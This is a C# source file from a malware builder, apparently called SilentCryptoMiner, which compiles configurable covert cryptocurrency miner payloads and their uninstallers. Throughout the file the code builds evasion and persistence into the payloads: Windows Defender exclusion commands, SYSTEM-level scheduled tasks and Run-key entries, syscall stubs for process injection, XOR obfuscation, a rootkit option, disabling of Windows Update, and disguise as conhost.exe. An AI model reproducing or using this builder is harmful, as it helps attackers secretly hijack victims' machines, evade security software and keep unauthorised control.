using Microsoft.CSharp;
using SilentCryptoMiner.Program;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace SilentCryptoMiner
{
    public class Codedom
    {
        public static Builder F;

        public static bool NativeCompiler(string savePath, string mainFileCode, string compilerCommand, string icoPath = "", bool assemblyData = false, bool requireAdministrator = false)
        {
            try
            {
                string currentDirectory = Path.GetDirectoryName(savePath);
                string filename = Path.GetFileNameWithoutExtension(savePath);
                var paths = new Dictionary<string, string>() {
                    { "windres",  Path.Combine(currentDirectory, @"UCompilers\gcc\bin\windres.exe") },
                    { "g++",  Path.Combine(currentDirectory, @"UCompilers\gcc\bin\g++.exe") },
                    { "syswhispers2",  Path.Combine(currentDirectory, @"UCompilers\SysWhispers2\SysWhispers2.exe") },
                    { "windreslog",  Path.Combine(currentDirectory, @"UCompilers\logs\windres.log") },
                    { "g++log",  Path.Combine(currentDirectory, @"UCompilers\logs\g++.log") },
                    { "syswhispers2log",  Path.Combine(currentDirectory, @"UCompilers\logs\SysWhispers2.log") },
                    { "manifest", Path.Combine(currentDirectory, "program.manifest") },
                    { "resource.rc", Path.Combine(currentDirectory, "resource.rc") },
                    { "resource.o", Path.Combine(currentDirectory, "resource.o") },
                    { "filename", Path.Combine(currentDirectory, filename) }
                };

                var directoryFilter = F.CheckNonASCII(savePath);
                if (F.BuildError(currentDirectory.Contains(" "), string.Format("Error: Build path \"{0}\" contains a space in its path, spaces are not allowed in some of the compiler programs. Please choose another build location without a space in its path.", savePath)) || F.BuildError(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following possible illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter))) || F.BuildError(!F.txtStartDelay.Text.All(new Func<char, bool>(char.IsDigit)), "Error: Start Delay must be a number.") || F.BuildError(!string.Join("", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }).All(new Func<char, bool>(char.IsDigit)), "Error: Assembly Version must only contain numbers."))
                    return false;

                var resource = new StringBuilder(Properties.Resources.resource);
                string defs = string.Empty;
                if (!string.IsNullOrEmpty(icoPath))
                {
                    resource.Replace("#ICON", F.ToLiteral(icoPath));
                    defs += " -DDefIcon";
                }

                if (assemblyData)
                {
                    //You can do the resource replace in 1 line by joining all the .Replace
                    resource.Replace("#TITLE", F.ToLiteral(F.txtAssemblyTitle.Text));
                    resource.Replace("#DESCRIPTION", F.ToLiteral(F.txtAssemblyDescription.Text));
                    resource.Replace("#COMPANY", F.ToLiteral(F.txtAssemblyCompany.Text));
                    resource.Replace("#PRODUCT", F.ToLiteral(F.txtAssemblyProduct.Text));
                    resource.Replace("#COPYRIGHT", F.ToLiteral(F.txtAssemblyCopyright.Text));
                    resource.Replace("#TRADEMARK", F.ToLiteral(F.txtAssemblyTrademark.Text));
                    resource.Replace("#VERSION", string.Join(",", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }));
                    defs += " -DDefAssembly";
                }

                CreateManifest(paths["manifest"], requireAdministrator);

                File.WriteAllText(paths["resource.rc"], resource.ToString());
                RunExternalProgram(paths["windres"], string.Format("--input resource.rc --output resource.o -O coff {1}", paths["windres"], defs), currentDirectory, paths["windreslog"]);
                Utils.deleteFiles(new string[] { paths["resource.rc"], paths["manifest"] });
                if (F.BuildError(!File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"])))
                    return false;

                var maincode = new StringBuilder(mainFileCode);
                ReplaceGlobals(ref maincode);

                RunExternalProgram(paths["syswhispers2"], "-a x64 -l gas --function-prefix \"Ut\" -f NtSetInformationFile,NtCreateFile,NtWriteFile,NtReadFile,NtCreateSection,NtClose,NtMapViewOfSection,NtCreateTransaction,NtOpenFile,NtRollbackTransaction,NtResumeThread,NtGetContextThread,NtSetContextThread,NtWriteVirtualMemory,NtProtectVirtualMemory,NtSetInformationProcess,NtDelayExecution -o UFiles\\Syscalls\\syscalls", currentDirectory, paths["syswhispers2log"]);

                File.WriteAllText(paths["filename"] + ".cpp", maincode.ToString());
                RunExternalProgram(paths["g++"], compilerCommand, currentDirectory, paths["g++log"]);
                Utils.deleteFiles(new string[] { paths["resource.o"], paths["filename"] + ".cpp" });
                if (F.BuildError(!File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["g++log"])))
                    return false;

                if (F.FormAO.toggleRootkit.Checked)
                    MakeRootkitHelper(savePath);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: An error occured while compiling the file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
            return true;
        }

        public static bool CheckerCompiler(string savePath)
        {
            var providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };
            var codeProvider = new CSharpCodeProvider(providerOptions);
            var parameters = new CompilerParameters();
            string OP = " /target:exe /platform:x64 /optimize ";

            CreateManifest(savePath + ".manifest", F.toggleAdministrator.Checked);
            OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = savePath;
            parameters.CompilerOptions = OP;
            parameters.IncludeDebugInformation = false;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");

            var checkerbuilder = new StringBuilder(Properties.Resources.Checker);
            ReplaceGlobals(ref checkerbuilder);
            var results = codeProvider.CompileAssemblyFromSource(parameters, checkerbuilder.ToString());

            try
            {
                File.Delete(savePath + ".manifest");
            }
            catch { }

            if (results.Errors.HasErrors)
            {
                foreach (CompilerError E in results.Errors)
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                return false;
            }

            if (F.FormAO.toggleRootkit.Checked)
                MakeRootkitHelper(savePath);

            return true;
        }

        public static bool UninstallerCompiler(string savePath)
        {
            var providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };
            var codeProvider = new CSharpCodeProvider(providerOptions);
            var parameters = new CompilerParameters();
            string OP = " /target:winexe /platform:x64 /optimize ";

            CreateManifest(savePath + ".manifest", F.toggleAdministrator.Checked);
            OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = savePath;
            parameters.CompilerOptions = OP;
            parameters.IncludeDebugInformation = false;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");

            if (F.FormAO.toggleRootkit.Checked)
            {
                using (var R = new System.Resources.ResourceWriter("uninstaller.Resources"))
                {
                    R.AddResource("rootkit_u", Properties.Resources.rootkit_u);
                    R.Generate();
                }

                parameters.EmbeddedResources.Add("uninstaller.Resources");
            }

            var uninstallerbuilder = new StringBuilder(Properties.Resources.Uninstaller);
            ReplaceGlobals(ref uninstallerbuilder);
            var results = codeProvider.CompileAssemblyFromSource(parameters, uninstallerbuilder.ToString());

            try
            {
                Utils.deleteFiles(new string[] { savePath + ".manifest", "uninstaller.Resources" });
            }
            catch { }

            if (results.Errors.HasErrors)
            {
                foreach (CompilerError E in results.Errors)
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                return false;
            }

            if (F.FormAO.toggleRootkit.Checked)
                MakeRootkitHelper(savePath);

            return true;
        }

        public static void MakeRootkitHelper(string savePath)
        {
            byte[] newFile = File.ReadAllBytes(savePath);
            Buffer.BlockCopy(BitConverter.GetBytes(0x7268), 0, newFile, 64, 2);
            File.WriteAllBytes(savePath, newFile);
        }

        public static void RunExternalProgram(string filename, string arguments, string workingDirectory, string logpath)
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = filename;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.WorkingDirectory = workingDirectory;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardError = true;
                process.Start();

                using (StreamWriter writer = File.AppendText(logpath))
                    writer.Write(process.StandardError.ReadToEnd());

                process.WaitForExit();
            }
        }

        public static void CreateManifest(string path, bool administrator)
        {
            var mb = new StringBuilder(Properties.Resources.template);
            mb.Replace("#MANIFESTLEVEL", administrator ? "requireAdministrator" : "asInvoker");
            File.WriteAllText(path, mb.ToString());
        }

        public static void CreateResource(StringBuilder output, string name, byte[] data)
        {
            StringBuilder file = new StringBuilder();
            file.AppendLine($"long {name}Size = {data.Length};");
            file.AppendLine($"unsigned char {name}[{data.Length}] = {{ {(data.Length > 0 ? "0x" + BitConverter.ToString(data).Replace("-", ",0x") : "")} }};");
            File.WriteAllText(Path.Combine(Path.GetDirectoryName(F.savePath), $"UFiles\\{name}.h"), file.ToString());
            output.AppendLine($"#include \"UFiles\\{name}.h\"");
        }

        public static byte[] Cipher(byte[] data, string key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                result[i] = (byte)(data[i] ^ key[i % key.Length]);

            return result;
        }

        public static string ReplaceEscape(string input)
        {
            StringBuilder output = new StringBuilder(input);
            output.Replace(@"\", @"\\");
            output.Replace(@"""", @"\""");
            output.Replace("<S>", "%S");
            return output.ToString();
        }

        public static void ReplaceGlobals(ref StringBuilder stringb)
        {
            bool systemadmincheck = F.toggleRunSystem.Checked && F.toggleAdministrator.Checked;

            if (F.mineETH || F.xmrGPU)
            {
                stringb.Replace("DefGPU", "true");

                if (F.xmrGPU)
                    stringb.Replace("DefXMRGPU", "true");
            }

            if (F.mineXMR)
                stringb.Replace("DefXMR", "true");

            if (F.toggleWDExclusions.Checked)
            {
                stringb.Replace("DefWDExclusions", "true");
                stringb.Replace("#WDCOMMAND", $"powershell Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramFiles) -Force");
            }

            if (F.FormAO.toggleRootkit.Checked) stringb.Replace("DefRootkit", "true");

            if (F.toggleDisableSleep.Checked) stringb.Replace("DefDisableSleep", "true");

            if (F.toggleWindowsUpdate.Checked) stringb.Replace("DefDisableWindowsUpdate", "true");

            if (F.toggleProcessProtect.Checked) stringb.Replace("DefProcessProtect", "true");

            if (F.chkBlockWebsites.Checked && !string.IsNullOrEmpty(F.txtBlockWebsites.Text))
            {
                stringb.Replace("DefBlockWebsites", "true");
                stringb.Replace("$DOMAINSETSIZE", F.txtBlockWebsites.Text.Split(',').Length.ToString());
                stringb.Replace("$CSDOMAINSET", $"\" {string.Join("\", \" ", F.txtBlockWebsites.Text.Split(','))}\"");
                stringb.Replace("$CPPDOMAINSET", $"AY_OBFUSCATE(\" {string.Join("\"), AY_OBFUSCATE(\" ", F.txtBlockWebsites.Text.Split(','))}\")");
            }

            if (int.Parse(F.txtStartDelay.Text) > 0)
            {
                stringb.Replace("DefStartDelay", "true");
                stringb.Replace("$STARTDELAY", F.txtStartDelay.Text + "000");
            }
            else
            {
                stringb.Replace("$STARTDELAY", "0");
            }

            if (F.chkStartup.Checked)
            {
                stringb.Replace("DefStartup", "true");
                string installdir;
                string basedir;
                switch (F.Invoke(new Func<string>(() => F.txtStartupPath.Text)) ?? "")
                {
                    case "AppData":
                        {
                            installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
                            basedir = "CSIDL_APPDATA";
                            break;
                        }

                    case "UserProfile":
                        {
                            installdir = "Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)";
                            basedir = "CSIDL_PROFILE";
                            break;
                        }

                    default:
                        {
                            installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
                            basedir = "CSIDL_APPDATA";
                            break;
                        }
                }

                if (systemadmincheck)
                {
                    installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)";
                    basedir = "CSIDL_PROGRAM_FILES";
                }

                stringb.Replace("$BASEDIR", basedir);
                stringb.Replace("PayloadPath", $"System.IO.Path.Combine({installdir}, \"{F.ToLiteral(F.txtStartupFileName.Text)}\")");

                stringb.Replace("#STARTUPFILE", @"\\" + F.txtStartupFileName.Text.Replace(@"\", @"\\"));

                if (F.toggleWatchdog.Checked) stringb.Replace("DefWatchdog", "true");

                if (F.toggleAutoDelete.Checked) stringb.Replace("DefAutoDelete", "true");

                if (F.FormAO.toggleRunInstall.Checked) stringb.Replace("DefRunInstall", "true");
            }

            stringb.Replace("$CSLIBSROOT", F.chkStartup.Checked && systemadmincheck ? "Environment.SpecialFolder.ProgramFiles" : "Environment.SpecialFolder.ApplicationData");
            stringb.Replace("$CPPLIBSROOT", F.chkStartup.Checked && systemadmincheck ? "CSIDL_PROGRAM_FILES" : "CSIDL_APPDATA");

            stringb.Replace("$FINDSET", $"\"{string.Join("\", \"", F.findSet)}\"");

            stringb.Replace("#WATCHDOGID", F.watchdogID);

            stringb.Replace("#STARTUPADD", ReplaceEscape($"powershell <#{F.Randomi(F.rand.Next(5, 10), false)}#> IF((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{ IF([System.Environment]::OSVersion.Version -lt [System.Version]\"6.2\") {{ \"schtasks /create /f /sc onlogon /rl highest {(systemadmincheck ? "/ru 'System'" : "")} /tn '{F.txtStartupEntryName.Text.Replace("'", "''")}' /tr '''<S>'''\" }} Else {{ Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute '<S>')  -Trigger (New-ScheduledTaskTrigger {(systemadmincheck ? "-AtStartup" : "-AtLogOn")})  -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000))  -TaskName '{F.txtStartupEntryName.Text.Replace("'", "''")}' {(systemadmincheck ? "-User 'System'" : "")} -RunLevel 'Highest' -Force; }} }} Else {{ reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtStartupEntryName.Text}\" /t REG_SZ /f /d '<S>' }}"));
            stringb.Replace("#STARTUPSTART", ReplaceEscape($"powershell <#{F.Randomi(F.rand.Next(5, 10), false)}#> IF((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{ schtasks /run /tn \"{F.txtStartupEntryName.Text}\" }} Else {{ \"<S>\" }}"));

            stringb.Replace("#TASKSCHREM", @$"/c schtasks /delete /f /tn \""{F.txtStartupEntryName.Text}\""");
            stringb.Replace("#REGREM", @$"/c reg delete \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""{F.txtStartupEntryName.Text}\"" /f");
            
            stringb.Replace("#CONHOSTPATH", F.FormAO.toggleRootkit.Checked ? @"\\dialer.exe" : @"\\conhost.exe");

            stringb.Replace("#CIPHERKEY", F.CipherKey);
            stringb.Replace("#UNAMKEY", F.UNAMKEY);
            stringb.Replace("#UNAMIV", F.UNAMIV);
        }
    }
}